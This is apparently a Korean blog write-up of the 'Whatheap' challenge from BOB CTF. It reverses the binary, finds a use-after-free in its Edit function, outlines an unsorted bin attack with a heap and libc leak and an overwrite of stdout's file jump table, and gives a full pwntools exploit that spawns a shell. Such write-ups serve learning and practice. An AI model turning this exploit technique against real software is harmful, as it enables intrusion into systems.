---
layout: post
title: BOB CTF - Whatheap Writeup
---

# BOB CTF - Whatheap Writeup

[Downoad](http://file.c2w2m2.com/whatheap)

### Reversing

먼저 바이너리를 둘러보면, system("/bin/sh")를 실행시켜주는 함수가 있으니 염두해 두고 시작한다.

![menu](https://i.imgur.com/FOwXpeN.png)

다음과 같은 메뉴가 있다. 하나하나 차례대로 살펴보자.

#### Malloc

Malloc함수를 먼저 한줄한줄 뜯어보자.

![Malloc](https://i.imgur.com/Jl25J7o.png)

먼저 처음 for문을 통해서 비어있는 공간을 찾는다. 공간을 찾으면, Size를 입력받고 이 Size가 200 ~ 300 범위에 있는지를 확인한다.

![Malloc-2](https://i.imgur.com/PSKjfHc.png)

그리고 입력받은 Size만큼 malloc을 하고, Data를 넣는데, 이때 받는 Data의 최소 길이는 16byte다. 그 이후 View함수를 출력하여 값을 확인시켜준다.



#### Free

![Free](https://i.imgur.com/pmqoGiS.png)

처음에 LODWORD(heap_context[2 * a1 + 1])을 Check하는데, 이 flag가 Free가 되었는지를 확인하는 flag임을 확인할 수 있다.

만약 Free가 안되었을경우, free를 진행하고, flag를 세팅해준다.



#### Edit

![Edit](https://i.imgur.com/wGwR7Wh.png)

Edit함수에서는 context에 있는 data를 수정할 수 있다.

이부분에서 이 chunk가 free가 되었는지를 체크하지 않아서, 취약점이 발생한다.



#### View

![View](https://i.imgur.com/pNYuvcl.png)

View를 보면 엄청 길지만, 중요한것은 이부분밖에없다. Free에서 봤듯이 단순한 Free가 되었는지를 체크한다.



### Scenario

우리가 할 수 있는것은 단순히 free된 chunk를 수정할 수 있다는 것 밖에 없다.

여기서 우리가 할 수 있는 공격은 unsorted bin attack이 있다. 하지만 free된 chunk를 볼 수 없으므로, Libc leak이 불가능하다.

따라서 House of Orange같은 공격을 바로 진행하는것이 불가능하다. 

그러므로 unsorted bin attack으로 노려야 할곳은 바로 heap_context이다. 이부분에 있는 heap pointer를 덮음으로써, 

main_arena를 자유롭게 수정할 수 있게 된다. 이를 수정함으로써 unsorted bin attack으로 인해서 깨졌던 main_arena를 고칠 수 있고,

libc leak, heap leak을 진행할 수도 있다.  leak을 진행한 후에, main_arena를 Fake _IO_FILE_JUMP로 만들 수 있다. 

그 후에 고친 main_arena로 인해서 unsorted bin attack이 한번 더 진행이 가능하고,

이때 stdout에 있는 _IO_file_Jump를 타겟으로 unsorted bin attack을 진행하면, main_arena의 값이 적히게 된다.

그러면 puts가 불릴때, main_arena의 주소로 뛰게 될것이고, 여기에는 우리가 적은 oneshot의 주소가 있을테니 Shell을 얻을 수 있다.

1. Unsorted bin attack으로 heap_context를 overwrite
2. heap_context를 Edit하면서 heap & libc leak
3. leak후에 main_arena를 정상으로 고치고, 뒷부분엔 oneshot의 주소를 적음
4. 한번 더 Unsorted bin attack으로 stdout의 _IO_FILE_JUMP를 overwrite
5. Get shell



### Exploit

```python
from pwn import *
    
def Malloc(size, data):
    p.recvuntil(":> ")
    p.send('1')
    p.recvuntil(":> ")
    p.send(str(size))
    p.recvuntil(":> ")
    p.send(data)

def Free(idx):
    p.recvuntil(":> ")
    p.send('2')
    p.recvuntil(":> ")
    p.send(str(idx))

def Edit(idx, data):
    p.recvuntil(":> ")
    p.send('3')
    p.recvuntil(":> ")
    p.send(str(idx))
    p.recvuntil(":> ")
    p.send(data)

def View(idx):
    p.recvuntil(":> ")
    p.send('4')
    p.recvuntil(":> ")
    p.send(str(idx))

if __name__ == '__main__':
    p = process("./whatheap")
    elf = ELF("./prob")
    libc = elf.libc

    Malloc(256, "A"*16)
    Malloc(256, "B"*16)
    Free(0)

    Edit(0, p64(0) + p64(0x602070 - 0x10))
    Malloc(256, "C"*16)

    View(1)
    p.recvuntil("--+\n")
    p.recvuntil("|")
    leak2 = p.recvuntil("|")[:-1]
    leak2 = leak2[125:]
    leak2 = u64(leak2.ljust(8,'\x00'))
    log.info("Leak2 : 0x%x" % leak2)
    pause()
    Edit(1, "A"*32)

    View(1)
    p.recvuntil("A"*32)
    leak = u64(p.recv(6).ljust(8,'\x00'))
    libcbase = leak - 0x3c4b78 - 0x10

    log.info("Leak : 0x%x" % leak)
    log.info("Libcbase : 0x%x" % libcbase)
    pause()
    Edit(1, p64(leak2) + p64(0) + p64(leak-0x10)*2 + p64(0x00000000040097e)*4)

    IO_file_jump = libcbase + 0x3C56F8
    print "0x%x" % IO_file_jump
    Malloc(256, "D"*16)
    Malloc(256, "E"*16)
    Free(2)
    Edit(2, p64(leak) + p64(IO_file_jump - 0x10))
    
    p.recvuntil(":> ")
    p.send('1')
    p.recvuntil(":> ")
    p.send('256')
    p.interactive()


```

![shell](https://i.imgur.com/LOSmaI2.png)

참고로 이문제는 system32.kr에 올라와있는 pwnable문제를 매우 조금 수정한것이다..(grin)
